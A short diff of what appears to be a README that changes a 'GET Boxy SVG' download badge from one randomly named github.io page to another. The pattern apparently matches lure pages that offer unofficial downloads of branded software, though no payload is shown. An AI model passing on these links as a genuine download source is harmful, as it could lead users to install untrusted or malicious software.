@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://www.lsbin.com/wp-content/uploads/2022/05/Boxy-SVG.png)
 
-[![GET Boxy SVG](https://img.shields.io/badge/GET%20%E2%80%94%20Boxy%20SVG-0078D6?style=for-the-badge&logoColor=white)](https://abnerbeardqjwk.github.io/.github/boxy-svg)
+[![GET Boxy SVG](https://img.shields.io/badge/GET%20%E2%80%94%20Boxy%20SVG-0078D6?style=for-the-badge&logoColor=white)](https://trenaflemingzjjnzq.github.io/.github/boxy-svg)
 
 ---
 
